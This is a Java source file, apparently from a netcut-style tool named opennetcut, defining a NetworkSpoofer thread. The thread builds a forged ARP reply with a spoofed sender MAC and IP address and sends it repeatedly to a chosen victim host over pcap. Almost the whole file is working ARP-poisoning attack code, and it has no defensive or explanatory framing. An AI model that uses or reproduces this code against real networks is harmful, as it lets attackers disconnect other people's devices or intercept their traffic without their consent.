package com.ardikars.opennetcut.app;

import com.ardikars.jxnet.Inet4Address;
import com.ardikars.jxnet.Jxnet;
import com.ardikars.jxnet.MacAddress;
import com.ardikars.jxnet.Pcap;
import com.ardikars.opennetcut.packet.protocol.datalink.Ethernet;
import com.ardikars.opennetcut.packet.protocol.network.ARP;
import com.ardikars.opennetcut.view.MainWindow;
import java.nio.ByteBuffer;
import java.util.logging.Level;
import java.util.logging.Logger;

@SuppressWarnings("unchecked")
public class NetworkSpoofer extends Thread {
    
    private volatile boolean stop = false;
    
    private Pcap pcap;
    
    private MacAddress spoofedMacAddr;
    private final Inet4Address spoofedIpAddr;
    private final MacAddress victimMacAddr;
    private final Inet4Address victimIpAddr;
    
    private final MacAddress currentHwAddr;
    
    private final long to_ms;
    
    private LoggerHandler<Integer, String> logHandler;
    
    public NetworkSpoofer(MacAddress victimMacAddr, Inet4Address victimIpAddr,
            MacAddress spoofedMacAddr, Inet4Address spoofedIpAddr,
            long to_ms, LoggerHandler logHandler) {
        this.spoofedIpAddr = spoofedIpAddr;
        this.spoofedMacAddr = spoofedMacAddr;
        this.victimIpAddr = victimIpAddr;
        this.victimMacAddr = victimMacAddr;
        this.currentHwAddr = MainWindow.main_windows.getCurrentHwAddr();
        this.to_ms = to_ms;
        this.logHandler = logHandler;
        pcap = MainWindow.main_windows.getPcap();
    }

    @Override
    public void run() {
        Ethernet ethernet = new Ethernet()
                .setDestinationMacAddress(victimMacAddr)
                .setSourceMacAddress(currentHwAddr)
                .setEtherType(Ethernet.EtherType.ARP)
                .setPadding(true);
        ARP arp = new ARP()
                .setHardwareType(ARP.HW_TYPE_ETHERNET)
                .setProtocolType(ARP.PROTO_TYPE_IP)
                .setHardwareAddressLength((byte) 0x06)
                .setProtocolAddressLength((byte) 0x04)
                .setOpCode(ARP.OperationCode.REPLY)
                .setSenderHardwareAddress(spoofedMacAddr) //spoofed
                .setSenderProtocolAddress(spoofedIpAddr) //spoofed
                .setTargetHardwareAddress(victimMacAddr)
                .setTargetProtocolAddress(victimIpAddr);
        ethernet.putChild(arp.toBytes());
        while (!stop) {
            try {
                sleep(to_ms);
            } catch (InterruptedException ex) {
                Logger.getLogger(NetworkSpoofer.class.getName()).log(Level.SEVERE, null, ex);
            }
            ByteBuffer buffer = ethernet.toBuffer();
            if (Jxnet.PcapSendPacket(pcap, buffer, buffer.capacity()) != 0) {
                if (logHandler != null) {
                    logHandler.log(LoggerStatus.COMMON, "[ WARNING ] :: Failed to send arp packet.");
                }
                stop = true;
            }
        }
    }
    
    public void stopThread() {
        this.stop = true;
    }
    
}
